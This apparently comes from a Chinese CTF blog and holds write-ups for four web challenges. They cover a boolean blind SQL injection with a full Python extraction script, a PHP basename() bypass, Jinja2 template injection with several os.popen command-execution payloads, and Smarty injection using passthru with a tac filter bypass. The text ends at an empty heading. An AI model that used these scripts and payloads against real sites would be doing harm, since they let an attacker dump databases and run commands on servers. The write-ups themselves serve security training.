    <url>/2022/04/22/WUSTCTF2020%20%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2">WUSTCTF2020
颜值成绩查询</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境，得到一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422105804.png" /></p>
<p>分别输入如下值时，页面出现了不一样： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=1 # Hi admin, your score is: 100</span><br><span class="line">1=2 # student number not exists.</span><br></pre></td></tr></table></figure></p>
<p>因此确定这里存在sql注入，并且没有闭合方式！</p>
<h1 id="解题">2. 解题</h1>
<p>首先fuzz了一波，发现什么都没有过滤，但是有时候加空格却不行，有时候加空格确可以，比如：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^(length((select (flag) from(flag)))&gt;0) # 可以</span><br><span class="line">0^(length((select flag from(flag)))&gt;0) # 不行</span><br></pre></td></tr></table></figure></p>
<p>以防万一，我就都用括号代替。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求数据库长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lenOfdb</span>(<span class="params">url</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(length(database())=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function lenOfdb is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % i)  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of db is %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库名字  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbName</span>(<span class="params">url, <span class="built_in">len</span></span>):</span>  </span><br><span class="line">    db = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&#x27;?stunum=0^(ascii(substr(database(),%d,1))=%d)&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function dbName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of database&#x27;s name is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                db += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the database&#x27;s name is : &quot;</span> + db )  </span><br><span class="line">    <span class="keyword">return</span> db  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库下group_concat(table_name)的长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesLen</span>(<span class="params">url, dbname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (dbname, i))  </span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the length of group_concat(table_name) is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求数据库下group_concat(table_name)所有表的名称  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tablesName</span>(<span class="params">url, dbname, tableslen</span>):</span>  </span><br><span class="line">    tablesname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function tablesName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tableslen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (dbname, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of tablesname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                tablesname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the tablesName is : &quot;</span> + tablesname)  </span><br><span class="line">    <span class="keyword">return</span> tablesname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下字段长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsLen</span>(<span class="params">url, tablename</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsLen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of columns is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下group_concat(column_name)的长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">columnsName</span>(<span class="params">url, tablename, columnlen</span>):</span>  </span><br><span class="line">    columnsname = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function columnsName is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, columnlen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (tablename, i, j))  </span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of columnsname is : &quot;</span> + <span class="built_in">chr</span>(j))  </span><br><span class="line">                columnsname += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the columnsname is : %s&quot;</span> % columnsname)  </span><br><span class="line">    <span class="keyword">return</span> columnsname  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下特定字段的信息长度  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InfoLen</span>(<span class="params">url, tablename, columnname</span>):</span>  </span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(length((select(%s)from(%s)))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function Infolen is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> count():  </span><br><span class="line">        finUrl = url + (payload % (columnname, tablename, i))  </span><br><span class="line">        <span class="comment"># print(finUrl)  </span></span><br><span class="line">        r = requests.get(finUrl)  </span><br><span class="line">        time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">        <span class="comment"># print(r.text)  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success! the len of Info is : %d&quot;</span> % i)  </span><br><span class="line">            <span class="built_in">len</span> = i  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 求特定表下特定字段的信息  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">url, tablename, columnname, Infolen</span>):</span>  </span><br><span class="line">    Info = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    payload = <span class="string">&quot;?stunum=0^(ascii(substr((select(%s)from(%s)),%d,1))=%d)&quot;</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the function getInfo is working!&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Infolen+<span class="number">1</span>):  </span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):  </span><br><span class="line">            finUrl = url + (payload % (columnname, tablename, i, j))  </span><br><span class="line">            <span class="comment"># print(finUrl)  </span></span><br><span class="line">            r = requests.get(finUrl)  </span><br><span class="line">            time.sleep(<span class="number">0.3</span>)  </span><br><span class="line">            <span class="comment"># print(r.text)  </span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of Info is : %s&quot;</span> % <span class="built_in">chr</span>(j))  </span><br><span class="line">                Info += <span class="built_in">chr</span>(j)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success! the Info is : %s&quot;</span> % Info)  </span><br><span class="line">    <span class="keyword">return</span> Info  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    url = <span class="string">&#x27;http://2f0a7c25-26c9-43ff-8aac-7afda31cb1f7.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line">    dblen = lenOfdb(url)  </span><br><span class="line">    db = dbName(url, dblen)  </span><br><span class="line">    tableslen = tablesLen(url, db)  </span><br><span class="line">    tablesTable = tablesName(url, <span class="string">&#x27;ctf&#x27;</span>, tableslen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(tablesTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择要查的表：(输入数字，从0开始)&quot;</span>)  </span><br><span class="line">    tIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    columnlen = columnsLen(url, tablesTable[tIndex])  </span><br><span class="line">    columnsTable = columnsName(url, tablesTable[tIndex], columnlen).split(<span class="string">&#x27;,&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(columnsTable)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择要查的字段：(输入数字，从0开始)&quot;</span>)  </span><br><span class="line">    cIndex = <span class="built_in">int</span>(<span class="built_in">input</span>())  </span><br><span class="line">    infolen = InfoLen(url, tablesTable[tIndex], columnsTable[cIndex])  </span><br><span class="line">    getInfo(url, tablesTable[tIndex], columnsTable[cIndex], infolen)</span><br></pre></td></tr></table></figure></p>
<p><strong>需要注意的是flag在flag表内的value字段下，而不在flag字段下</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>布尔盲注</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Can you guess it</title>
    <url>/2022/04/24/Zer0pts2020%20Can%20you%20guess%20it/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">Can
you guess it?</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后，点击Source得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>乍一看，有两个突破点：</p>
<ol type="1">
<li><p>通过highlight_file()函数，把confi.php当作参数即可；</p></li>
<li><p>绕过hash_equals()，从而输出flag；</p></li>
</ol>
<p>但是，经过分析，第二点无法突破，<code>$secret</code>是随机的，hash_equals不像其他函数可以通过数组这些绕过。因此，目光回到第一点。</p>
<p>首先，假设我们的url为:
<code>http://hostname/test/index.php?source=balabala</code>，那么<code>$_SERVER['PHP_SELF'])</code>的返回结果就是/test/index.php；<code>basename($_SERVER['PHP_SELF'])</code>返回的结果就是index.php。</p>
<p>乍一看很完美，没有漏洞可言，但是basename有一个小问题，那就是如果地址中文件的后面出现非ascii码的特殊字符（不在ASCII码中），那么basename就会当作没看见。比如这样的url:
<code>http://hostname/test/basename.php/%81?source=balabala</code>（这里的%81值得是16进制的81，而ascii码最大就到7f，因此已经超过），那么此时，basename眼中的url为<code>http://hostname/test/basename.php/?source=balabala</code>，因此最终返回的结果就是basename.php。</p>
<p>我在自己的主机上编写了如下代码做测试： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/basename.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span>(basename(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>正常的url:
<code>/test/basename.php/config.php?source=balabla</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424232954.png" /></p>
<p>如果url为:
<code>/test/basename.php/config.php/%81?source=balabla</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233105.png" /></p>
<p>知道了前置知识后就简单了。</p>
<p>首先我们要绕过正则匹配，其实只要<code>$_SERVER['PHP_SELF']</code>的值不以config.php结尾即可，因此只要在config.php后面随便加点什么就行了。又因为经过basename函数最终的结果要为config.php，所以最终的payload为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%81?source</span><br></pre></td></tr></table></figure></p>
<p>其实%80也可以，但是本地测试的时候是不行的，不知道什么原因。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424233512.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>PHP知识</tag>
        <tag>basename绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_SSTI_2</title>
    <url>/2022/04/05/bugku_SSTI_2/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/203.html</p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境。得到提示信息
<code>You need pass in a parameter named flag</code>。又因为题目带有SSTI，根据决策树</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>直接尝试如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?flag=$&#123;7*7&#125; # 结果：$&#123;7*7&#125;</span><br><span class="line">2. ?flag=&#123;&#123;7*7&#125;&#125; # 结果：49</span><br><span class="line">3. ?flag=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果：7777777</span><br></pre></td></tr></table></figure></p>
<p>因此判断模板引擎是Jinjia2或者是flask。</p>
<h1 id="解题">2 解题</h1>
<p>输入如下payload： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>从中找出如下可用的子类： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">75.</span> &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_frozen_importlib</span>.<span class="title">_ModuleLock</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">127. &lt;<span class="title">class</span> &#x27;<span class="title">os</span>.<span class="title">_wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">128. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">Quitter</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">129. &lt;<span class="title">class</span> &#x27;<span class="title">_sitebuiltins</span>.<span class="title">_Printer</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接下来共有4种方法</p>
<ul>
<li><p>方法1 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p></li>
<li><p>方法2</p></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Flask</tag>
        <tag>Jinjia2</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku_聪明的php</title>
    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag
file's filename is random :&gt;</p>
<p>随便给一个参数，得到如下界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>发现关键词<code>smarty</code>。</p>
<h1 id="解题">解题</h1>
<p>本题已知模板引擎为SSTI，那么接下来就应该判断以下版本
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
<p>版本为3.1。</p>
<p>那么<a
href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
<h2 id="命令执行">命令执行</h2>
<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
<h2 id="if标签">{if}标签</h2>
